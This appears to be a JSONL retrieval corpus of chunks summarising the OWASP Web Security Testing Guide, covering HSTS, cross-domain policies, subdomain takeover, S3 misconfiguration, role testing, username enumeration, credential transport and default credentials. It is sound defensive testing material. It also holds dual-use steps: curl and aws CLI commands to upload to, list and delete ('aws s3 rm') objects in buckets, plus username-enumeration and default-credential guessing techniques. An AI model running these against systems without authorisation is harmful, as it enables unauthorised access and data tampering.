{"id": "kb-000484", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Important Directives**: The HSTS header features three main directives:\n1. **max-age**: specifies the duration in seconds for which the browser should remember to convert HTTP requests to HTTPS.\n2. **includeSubDomains**: ensures that all associated subdomains also use HTTPS.\n3. **preload (Unofficial)**: indicates that the domain is on a preload list, preventing browsers from connecting without HTTPS."}
{"id": "kb-000485", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Example of HSTS Header Implementation**: An example of how to implement HSTS in a response header is: `Strict-Transport-Security: max-age=31536000; includeSubDomains`, indicating that the site should be accessed only with HTTPS for the next year."}
{"id": "kb-000486", "section": null, "tags": ["CRYPTO", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Security Issues Addressed by HSTS**: The use of HSTS helps mitigate risks such as:\n- Network traffic being sniffed and accessed over unencrypted channels;\n- Man-in-the-middle attacks exploiting untrusted certificates;\n- Users inadvertently accessing sites via HTTP instead of HTTPS, often due to mistyped URLs or misleading links."}
{"id": "kb-000487", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Testing Objectives**: The core objective of testing is to review the HSTS header, validate its implementation, and ensure that it is correctly configured to provide security benefits."}
{"id": "kb-000488", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "**Testing Methodology**: To verify the presence of the HSTS header, it can be tested using tools such as an intercepting proxy or command-line tools like curl: `curl -s -D- https://owasp.org | grep -i strict` helps in checking for the `Strict-Transport-Security` header in the response. Rich Internet Applications (RIA) utilize Adobe's crossdomain.xml policy files for secure cross-domain data access."}
{"id": "kb-000489", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Cross-domain policy files specify the permissions that web clients (like Java, Adobe Flash, etc.) have to access data across different domains."}
{"id": "kb-000490", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Silverlight has a similar policy mechanism, using a subset of Adobe's crossdomain.xml and its own clientaccesspolicy.xml, which allows for more granular control. A web client checks for a master policy file located at the domain root before proceeding to any specified policy file."}
{"id": "kb-000491", "section": null, "tags": ["API", "AUTHN", "CSRF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The types of permissions granted by policy files include: sockets permissions, header permissions, HTTP/HTTPS access permissions, and allowing access based on cryptographic credentials. An example of an overly permissive policy file allows all domains unrestricted access, presenting significant security vulnerabilities. Overly permissive cross-domain policies can lead to cross-site request forgery (CSRF) attacks and allow unauthorized data access."}
{"id": "kb-000492", "section": null, "tags": ["API", "CSRF"], "source": "wstg-v4.2.pdf", "text": "Defeating Cross-Site Request Forgery (CSRF) protections and reading data that is restricted by cross-origin policies are potential impacts of abusing cross-domain access. The test objectives include reviewing and validating the policy files associated with cross-domain access."}
{"id": "kb-000493", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test for weaknesses in Rich Internet Application (RIA) policy files, testers should attempt to retrieve the policy files 'crossdomain.xml' and 'clientaccesspolicy.xml' from the root and any folders of the application."}
{"id": "kb-000494", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example path for testing includes attempting to download 'http://www.owasp.org/crossdomain.xml' and 'http://www.owasp.org/clientaccesspolicy.xml'."}
{"id": "kb-000495", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Permissions in the policy files should be checked against the least privilege principle, ensuring that requests are only permitted from necessary domains, ports, or protocols, and avoiding overly permissive settings. An example of an overly permissive policy is: '<cross-domain-policy> <allow-access-from domain=\"*\" /> </cross-domain-policy>'. Expected results from testing include a list of found policy files and a list of weak settings identified within those policies. Tools recommended for testing include Nikto, OWASP Zed Attack Proxy Project, and W3af. Test File Permission (ID: WSTG-CONF-09) addresses security risks associated with improper file permissions in web security."}
{"id": "kb-000496", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Sensitive resources must not have permissions that allow greater access than necessary. Improper permissions can lead to exposure or modification by unauthorized users."}
{"id": "kb-000497", "section": null, "tags": ["API", "CONF"], "source": "wstg-v4.2.pdf", "text": "Examples of vulnerable resources include execution files that unauthorized users can access and configuration files that contain sensitive data like account information or API tokens."}
{"id": "kb-000498", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test file permissions in Linux, one can use the 'ls' command or 'namei' command to check permissions. For example, the command 'namei -l /PathToCheck/' lists the permissions of files recursively."}
{"id": "kb-000499", "section": null, "tags": ["CONF", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Files that should be reviewed include web files, configuration files, sensitive files (like encrypted data), log files, executables, database files, temp files, and upload files. The remediation step is to set proper permissions on files and directories to prevent unauthorized access. Tools recommended for file permission testing include Windows AccessEnum, Windows AccessChk, and Linux namei."}
{"id": "kb-000500", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "CWE-732 is referenced, which denotes 'Incorrect Permission Assignment for Critical Resource', indicating a specific weakness related to file permissions."}
{"id": "kb-000501", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Subdomain takeover exploits allow an attacker to claim control over a victim's subdomain if certain conditions are met, primarily the victim's DNS record pointing to an inactive resource."}
{"id": "kb-000502", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Attacks enabled by successful subdomain takeovers include serving malicious content, phishing, and stealing user credentials such as session cookies."}
{"id": "kb-000503", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Various DNS resource records can be vulnerable to subdomain takeover, including A, CNAME, MX, NS, and TXT records, with NS records posing the greatest risk due to their potential to compromise entire DNS zones."}
{"id": "kb-000504", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Example scenarios illustrate subdomain takeover: 1) A victim using GitHub misconfigures their DNS record as they change platforms, allowing attackers to claim the subdomain. 2) A victim's domain expiration results in unauthorized control over associated DNS records if they are not properly removed."}
{"id": "kb-000505", "section": null, "tags": ["CONF", "INFO"], "source": "wstg-v4.2.pdf", "text": "Testing for subdomain takeovers includes identifying forgotten or misconfigured domains by conducting DNS enumeration and resource record checks using methods like DNS brute force and OSINT data sources."}
{"id": "kb-000506", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "NXDOMAIN, SERVFAIL, and REFUSED are DNS response statuses indicating that the queried resource could not be retrieved. NXDOMAIN indicates that the domain does not exist, SERVFAIL is for server issues, and REFUSED means the query was refused by the server."}
{"id": "kb-000507", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Performing DNS enumeration can help identify potential vulnerabilities in a domain's structure. Tools like dnsrecon can facilitate this process by providing information such as configured subdomains and DNS resource records."}
{"id": "kb-000508", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The dig command is useful for inspecting DNS records. In this case, using dig on a CNAME record returned an NXDOMAIN status, which suggests that the subdomain is inactive or misconfigured and merits further investigation."}
{"id": "kb-000509", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A subdomain takeover is a potential attack wherein a subdomain points to a resource that is invalid or unconfigured, leading an attacker to hijack the subdomain."}
{"id": "kb-000510", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "If a DNS A record returns a 404 error upon requesting the associated subdomain, it indicates that the resource is not available at that address, which may further suggest a vulnerability to takeover. Web security testing involves the process of identifying vulnerabilities and security weaknesses in web applications. GitHub Pages can be used to claim a domain, which can be tested for subdomain takeover vulnerabilities. To test for a potential subdomain takeover, it is essential to identify all nameservers associated with the domain in scope."}
{"id": "kb-000511", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Examples of web security tests include checking the response from a 404 file not found error on platforms like GitHub, which can confirm whether a domain is properly configured."}
{"id": "kb-000512", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing DNS for vulnerabilities is crucial, as subdomains can be taken over if a corresponding domain is inactive or available for purchase. If a tester receives responses like SERVFAIL or REFUSED, it indicates potential issues that need further scrutiny in DNS responses."}
{"id": "kb-000513", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In gray-box testing, where the tester has access to the DNS zone file, the methodology remains similar to that of black-box testing, indicating the importance of the resource record's status in both situations."}
{"id": "kb-000514", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To remediate the risk of subdomain takeover, it is recommended to remove vulnerable DNS resource records from the DNS zone and to implement continuous monitoring practices."}
{"id": "kb-000515", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Several tools that can aid in web security testing and DNS enumeration include: dig, recon-ng, theHarvester, Sublist3r, dnsrecon, and OWASP Amass."}
{"id": "kb-000516", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Cloud storage services enable web applications to store and access objects, but improper access control can lead to sensitive data exposure or unauthorized access."}
{"id": "kb-000517", "section": null, "tags": ["API", "AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "An example of this is a misconfigured Amazon S3 bucket, which can result in unauthorized users gaining access to upload, modify, or read stored files. To ensure security in cloud storage, it is crucial to assess access control configurations and ensure proper restrictions are in place."}
{"id": "kb-000518", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Testing for misconfigurations involves identifying the storage service's URL and executing tests such as attempting to read unauthorized data or upload arbitrary files using command-line tools like curl."}
{"id": "kb-000519", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The curl commands provided for testing include:\n1. Reading an object: curl -X GET https://<cloud-storage-service>/<object>\n2. Uploading a file: curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'"}
{"id": "kb-000520", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "S3 bucket URLs can be accessed in two styles: virtual host style and path-style, with the virtual hosted style format being: https://bucket-name.s3.Region.amazonaws.com/key-name. Path-Style Access example: https://s3.us-west-2.amazonaws.com/my-bucket/puppy.jpg. Virtual Hosted Style Access example: https://bucket-name.s3.amazonaws.com Path-Style Access example: https://s3.amazonaws.com/bucket-name"}
{"id": "kb-000521", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "S3 URLs can be identified in HTTP messages, specifically in the img tag. Example: <img src=\"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\"> For gray-box testing, bucket URLs can be retrieved from Amazon's web interface, documents, source code, or other sources. Testing can be conducted using AWS Command-line tool with the s3:// protocol. Command to list all objects in a public bucket: aws s3 ls s3://<bucket-name> Command to upload a file to S3: aws s3 cp arbitrary-file s3://bucket-name/path-to-save The command 'aws s3 cp test.txt s3://bucket-name/test.txt' is used to upload files to an Amazon S3 bucket. Successful upload example: 'upload: ./test.txt to s3://bucket-name/test.txt' indicates that the file has been uploaded without issues."}
{"id": "kb-000522", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Failure example: 'upload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred (AccessDenied) when calling the PutObject operation: Access Denied' shows the output when permission issues occur during upload. To remove an object from an Amazon S3 bucket, the command 'aws s3 rm s3://bucket-name/object-to-remove' is used."}
{"id": "kb-000523", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Role-Based Access Control (RBAC):** Users in an application have defined roles that determine their access permissions. Common roles include administrator, auditor, support engineer, and customer, each with distinct functionalities."}
{"id": "kb-000524", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Test Objectives for Role Definitions:** 1. Identify and document roles used by the application. 2. Attempt to switch, change, or access another role. 3. Review the granularity of roles in relation to the permissions granted."}
{"id": "kb-000525", "section": null, "tags": ["AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Testing Methodologies for Role Identification:** - Consulting application documentation. - Guided insights from developers or administrators. - Analyzing application comments. - Fuzzing possible roles through cookie variables, account variables, hidden directories, or user switching (to known roles such as 'admin')."}
{"id": "kb-000526", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Switching to Available Roles:** Identifying roles is a step towards testing if unauthorized access can be achieved. It’s important to recognize that identifying roles does not inherently indicate a vulnerability; roles can be adequately protected by application policies or signatures."}
{"id": "kb-000527", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Reviewing Role Permissions:** It’s crucial for testers to understand the specific permissions associated with each role to prevent misuse. For instance, a support engineer should not have administrative functionalities, thereby ensuring a strict separation of duties."}
{"id": "kb-000528", "section": null, "tags": ["AUTHN", "BUSINESS"], "source": "wstg-v4.2.pdf", "text": "An administrator should not have full powers on the system; instead, sensitive admin functionality should utilize a maker-checker principle or multi-factor authentication (MFA) to ensure accountability and security."}
{"id": "kb-000529", "section": null, "tags": ["API", "AUTHN"], "source": "wstg-v4.2.pdf", "text": "The Twitter incident in 2020 serves as a key example illustrating the importance of restricting administrator powers and implementing proper authentication measures. Web security testing can be performed without additional tools, relying solely on the system being accessed."}
{"id": "kb-000530", "section": null, "tags": ["AUTHZ", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "For easier documentation and testing of access controls, tools such as Burp's Autorize extension and ZAP's Access Control Testing add-on can be used."}
{"id": "kb-000531", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Some websites automate or semi-automate the user registration process for system access provisioning, especially when dealing with large user bases. The identity requirements for access can vary from strict identification to none, based on security requirements. Public applications often automate user registration, while corporate applications may require manual provisioning."}
{"id": "kb-000532", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives for user registration include verifying alignment of identity requirements with business/security needs and validating the registration process."}
{"id": "kb-000533", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Key questions to test user registration identity requirements include: Can anyone register? Are registrations manually vetted? Can the same identity register multiple times? Can users register for different roles? What proof of identity is required? Are registered identities verified?"}
{"id": "kb-000534", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To validate the registration process, check if identity information can be easily forged and if the identity information exchange can be manipulated. An example case is WordPress, which requires only an email address for registration, demonstrating a minimal identification requirement."}
{"id": "kb-000535", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The text compares the identification requirements for user registration between WordPress and Google, indicating that Google's requirements are more stringent. Specific details of the Google registration requirements include: name, date of birth, country, mobile phone number, email address, and CAPTCHA response. In contrast, WordPress has less stringent identification requirements."}
{"id": "kb-000536", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The importance of aligning identification and verification requirements with the security needs of the information that credentials protect is emphasized, indicating a principle of security design in user registration processes."}
{"id": "kb-000537", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "A technical recommendation is provided that suggests using HTTP proxies as tools to test the controls related to user registration, highlighting a practical application in web security testing. The process of account provisioning presents a vulnerability if proper identification and authorization are not applied. Test Objective: To verify the roles that can provision accounts and the types of accounts they can create."}
{"id": "kb-000538", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Key Questions for Testing: Determine user roles that can provision accounts, assess if there are verification processes for provisioning and de-provisioning requests, and whether an administrator can provision accounts with greater privileges than their own."}
{"id": "kb-000539", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example from WordPress: For account provisioning, only a username and email address are required. The de-provisioning process in WordPress includes selecting users for deletion and deciding how to handle their posts, either by deleting or transferring them."}
{"id": "kb-000540", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The purpose of the test is to identify whether valid usernames can be collected through interactions with the application's authentication mechanism, which is pivotal for subsequent brute-force attacks."}
{"id": "kb-000541", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Web applications may inadvertently disclose the existence of usernames during authentication attempts, often through specific error messages which indicate whether a username is present or if the password is incorrect."}
{"id": "kb-000542", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "For example, an application may have a message indicating that a username exists when provided with wrong credentials, revealing valuable information that attackers can use to compile a user list."}
{"id": "kb-000543", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testers need to examine how the application responds to different authentication attempts—namely, using valid and invalid usernames and passwords—to discern information leakage that may assist in user enumeration."}
{"id": "kb-000544", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The methodology for testing in a black-box context is critical, as the tester interacts with the application without prior knowledge of its internal mechanics, focusing on the outcomes of their inputs, particularly examining HTTP response messages for discrepancies."}
{"id": "kb-000545", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "To test for valid credentials, the tester captures the server’s response when submitting a valid username and password combination and observes the response characteristics (e.g., HTTP status, response length)."}
{"id": "kb-000546", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing should also include attempts to authenticate with valid usernames but incorrect passwords, and the tester should note the error messages returned by the application, as they often divulge indications of user existence."}
{"id": "kb-000547", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The importance of web security testing in authentication processes, particularly focusing on how applications respond to failed login attempts."}
{"id": "kb-000548", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Key concept of consistent error messaging in security; applications should provide uniform responses for valid users with incorrect passwords and nonexistent usernames. This prevents attackers from discerning valid usernames based on system messages."}
{"id": "kb-000549", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Example of variable server responses: When a user attempts to log in with a valid username and an incorrect password, the response reveals more about the state of the username ('The password is not correct') as opposed to when attempting with an invalid username ('User not recognized'). This difference can be exploited to enumerate valid usernames."}
{"id": "kb-000550", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The methodology for testing user authentication: Inserting invalid user IDs and recording server responses to collect data on error messages and response lengths. This helps in identifying vulnerabilities in the authentication process."}
{"id": "kb-000551", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Potential ways for testers to enumerate users include analyzing error codes on login pages and examining URL parameters in error messages, which can reveal sensitive information."}
{"id": "kb-000552", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "When testing a web application, providing different user credentials can yield different error messages, allowing testers to identify valid user accounts. For example, entering a valid username with a wrong password can show an error that confirms the username exists."}
{"id": "kb-000553", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "URI Probing is a technique in web security testing where testers send requests to potential user directories to see how the server responds, using specific codes like '403 Forbidden' and '404 Not Found' to gather information on user existence."}
{"id": "kb-000554", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common server responses include:\n- 403 Forbidden: Indicates that the user exists but does not have permission to access the page.\n- 404 Not Found: Indicates that the user does not exist."}
{"id": "kb-000555", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing web application titles can provide insights into authentication issues. Titles such as 'Invalid user' or 'Invalid authentication' signal problems with user credentials."}
{"id": "kb-000556", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Recovery facilities (like 'forgot password') may return user existence information. A message stating 'Your password has been sent' implies the username exists, while messages indicating an invalid username reveal non-existence."}
{"id": "kb-000557", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Friendly error messages may not return standard error codes, like receiving a '200 OK' with an image instead of a '404 Not Found'. This could mean the requested user does not exist, requiring careful analysis of server responses."}
{"id": "kb-000558", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Response times can be indicative of user validity; longer response times during certain requests (like password recovery) suggest that a valid user is being checked against an external service. This can help conclude whether a username is valid or not."}
{"id": "kb-000559", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "User IDs can follow specific patterns set by administrators or companies, such as sequential numbering or REALM aliases (e.g., CN000100, R1001). Shell scripts can be used with tools like wget to automate queries for valid user IDs."}
{"id": "kb-000560", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Patterns in user IDs can include associations with credit card numbers or be derived from real names using logical assumptions (e.g., if one user is 'fmercury', another might be 'rtaylor'). Google and tools can help in gathering information to enumerate user accounts based on domain targeting."}
{"id": "kb-000561", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Care should be taken when enumerating user accounts, as repeated failed attempts can lead to account lockouts or IP bans due to application security policies."}
{"id": "kb-000562", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Gray-box testing involves verifying the consistency of authentication error messages, ensuring the application responds identically for all clients with failed authentication attempts."}
{"id": "kb-000563", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "For remediation, ensure applications return generic error messages for failed logins, and delete default/test accounts before production deployment. Useful tools for web security testing mentioned include OWASP Zed Attack Proxy (ZAP), curl, and Perl."}
{"id": "kb-000564", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "User account names often follow structured formats, making them susceptible to being guessed by attackers. For example, the account name for Joe Bloggs is commonly represented as 'jbloggs'."}
{"id": "kb-000565", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The test objectives for security include determining if the account name structure could enable account enumeration and if error messages can reveal valid account names."}
{"id": "kb-000566", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing methods involve analyzing the pattern of account names, assessing application responses to both valid and invalid account names, and leveraging discrepancies in responses to infer information about valid accounts. Utilizing dictionaries of common account names can aid in enumerating valid accounts through systematic testing of these generated names."}
{"id": "kb-000567", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "To remediate weaknesses, applications should provide uniform and generic error messages regardless of whether the entered username, password, or other credentials are correct. This reduces the amount of information potentially leaked during authentication attempts."}
{"id": "kb-000568", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Testing for credentials transport verifies that web applications encrypt authentication data in transit to prevent account takeovers from network traffic sniffer attacks. Web applications use HTTPS to encrypt information in transit for both client-to-server and server-to-client communications."}
{"id": "kb-000569", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Examples of credential exchanges include: a client sending a credential to request login, a server responding to a successful login with a session token, an authenticated client sending a session token to request sensitive information, and a client sending a token for password resets."}
{"id": "kb-000570", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Failure to encrypt credentials in transit can expose sensitive data to attackers using tools like Wireshark or via proxies that capture HTTP requests."}
{"id": "kb-000571", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The security of encrypted traffic relies not only on whether encryption is used but also on the strength of the encryption algorithm and key management."}
{"id": "kb-000572", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Test objectives include assessing web applications to ensure credentials are exchanged using encryption during interactions such as login and data requests."}
{"id": "kb-000573", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "To test for credential transport issues, one can capture traffic between the client and server using tools like the web browser's developer tools or OWASP ZAP, ensuring that browser plugins favoring HTTPS are disabled during the test."}
{"id": "kb-000574", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When analyzing captured traffic, testers should look for sensitive information such as passphrases, tokens, or account reset codes and verify they were exchanged over HTTPS."}
{"id": "kb-000575", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "When testing web security, particularly during login processes, one should check if the login page can be accessed via HTTP instead of HTTPS, which would expose sensitive information."}
{"id": "kb-000576", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "A successful login attempt should maintain the secure connection with HTTPS for the request URL, ensuring that credentials such as j_username and j_password are encrypted during transmission."}
{"id": "kb-000577", "section": null, "tags": ["AUTHN", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Response headers from a secure login request should include attributes such as 'Secure' for session cookies, as this prevents exposure over unencrypted channels."}
{"id": "kb-000578", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "If the login request switches from HTTPS to HTTP, it can lead to credential exposure in plaintext, which is a significant security vulnerability."}
{"id": "kb-000579", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The failing test example highlights the risk of unencrypted data transfer, where usernames and passwords appear in plaintext, emphasizing the importance of using HTTPS for all sensitive transactions."}
{"id": "kb-000580", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Similarly, testing should extend to account creation functionalities, verifying if they also enforce secure protocols to protect against credential theft."}
{"id": "kb-000581", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The test for web security passes if a new account request is sent over HTTPS, ensuring secure transmission of sensitive data such as usernames and passwords."}
{"id": "kb-000582", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "A successful account creation in web applications typically involves receiving a session token from the server, indicated by the presence of a 'Set-Cookie' header with the 'Secure' attribute."}
{"id": "kb-000583", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The 'Set-Cookie' header is crucial for security in web applications; it should contain the 'Secure' attribute to prevent transmission over unsecured HTTP connections."}
{"id": "kb-000584", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The security test fails if the account request is sent over unencrypted HTTP, exposing sensitive information such as usernames and passwords in the POST data, making it vulnerable to interception."}
{"id": "kb-000585", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example request demonstrates how sensitive user data can be transmitted and highlights the importance of using HTTPS to protect such information during transmission."}
{"id": "kb-000586", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Ensure that all interactions involving sensitive user credentials (like changing passwords or editing credentials) are conducted over HTTPS to protect against man-in-the-middle attacks."}
{"id": "kb-000587", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Forced browsing should be tested by accessing the HTTP version of the website after logging in to verify if any credentials are leaked; ideally, session tokens should never be sent over HTTP."}
{"id": "kb-000588", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Example of a secure request: the session token is encrypted when sent over HTTPS, protecting it from interception, as shown in request headers that include cookies for session management."}
{"id": "kb-000589", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Example of an insecure request: if the session token is exposed over HTTP, it indicates a serious vulnerability, as detailed in the provided request header examples."}
{"id": "kb-000590", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Remediation steps include using HTTPS for the entire website, implementing HTTP Strict Transport Security (HSTS), and ensuring that any HTTP requests are redirected to HTTPS to prevent exposure of sensitive tokens."}
{"id": "kb-000591", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTPS prevents attackers from modifying interactions with the web server and helps in avoiding JavaScript malware placement through compromised routers. Using HTTPS helps avoid losing customers due to insecure site warnings; new browsers indicate HTTP-based websites as insecure."}
{"id": "kb-000592", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Certain applications, such as those using Android APIs, require overrides to connect via HTTP, making HTTPS a preferred option to simplify development."}
{"id": "kb-000593", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Organizations should prioritize switching to HTTPS for sensitive operations first and plan to convert the entire application to HTTPS to prevent customer loss due to security compromises or HTTP warnings."}
{"id": "kb-000594", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "If organizations do not currently purchase certificates for HTTPS, they should consider using Let’s Encrypt or other free certificate authorities."}
{"id": "kb-000595", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Default credentials are common in web applications and hardware devices, leading to security vulnerabilities if not changed by administrators."}
{"id": "kb-000596", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Many applications come with non-configurable default accounts that can be exploited by attackers due to widespread knowledge of these defaults."}
{"id": "kb-000597", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Common causes of default credential issues include: inexperienced IT personnel failing to change defaults for ease of maintenance, programmers leaving back doors in applications, and applications not enforcing password changes upon first login."}
{"id": "kb-000598", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Test objectives for identifying default credentials include enumerating applications for existing defaults and reviewing new user accounts for predictable passwords."}
{"id": "kb-000599", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Black-box testing involves testing applications without prior knowledge of their infrastructure, often contradicting common practice where some knowledge is available."}
{"id": "kb-000600", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "To test for default credentials, one should identify the application interfaces known to have administrative access and attempt to log in using known default credentials from manufacturer documentation or other resources."}
{"id": "kb-000601", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "It's important to note that attempts to guess passwords may lead to account lockouts, which complicates access for legitimate administrators."}
{"id": "kb-000602", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Many applications reveal verbose error messages that can indicate valid usernames, which can aid in testing for default or guessable user accounts on pages like login, password reset, and sign-up pages."}
